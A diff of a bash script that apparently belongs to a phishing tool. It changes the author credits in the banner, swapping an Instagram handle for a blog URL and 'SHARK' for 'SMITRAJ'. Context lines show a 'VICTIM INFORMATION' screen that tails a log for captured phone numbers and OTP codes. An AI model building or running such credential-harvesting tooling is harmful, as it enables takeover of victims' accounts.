@@ -18,7 +18,7 @@ banner()
   printf "`tput bold` %-40s `tput sgr0`\n" "$@"
   echo
   echo -e "\e[32m============================================\e[m "
-  echo -e "\e[31m    [\e[32m★\e[31m]\e[93m Instagram : bhikan_deshmukh \e[31m [\e[32m★\e[31m]\e[m "
+  echo -e "\e[31m    [\e[32m★\e[31m]\e[93m WEBSITE : techsmit12.blogspot.com \e[31m [\e[32m★\e[31m]\e[m "
   echo -e "\e[32m============================================\e[m "
 }
 
@@ -229,7 +229,7 @@ banner()
   printf "`tput bold` %-40s `tput sgr0`\n" "$@"
   echo
   echo -e "\e[32m============================================\e[m "
-  echo -e "\e[31m    [\e[32m★\e[31m]\e[93m Instagram : bhikan_deshmukh \e[31m [\e[32m★\e[31m]\e[m "
+  echo -e "\e[31m    [\e[32m★\e[31m]\e[93m WEBSITE : techsmit12.blogspot.com \e[31m [\e[32m★\e[31m]\e[m "
   echo -e "\e[32m============================================\e[m "
 }
 
@@ -923,7 +923,7 @@ ash1() {
 			   echo
 			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
 			   echo
-			   echo -e "\e[96m========================\e[92m    SHARK © 2021    \e[96m========================= \e[92m"
+			   echo -e "\e[96m========================\e[92m    SMITRAJ © 2021    \e[96m========================= \e[92m"
                            echo
                            tail -f log.txt | grep -e "number" -e "otp"
 
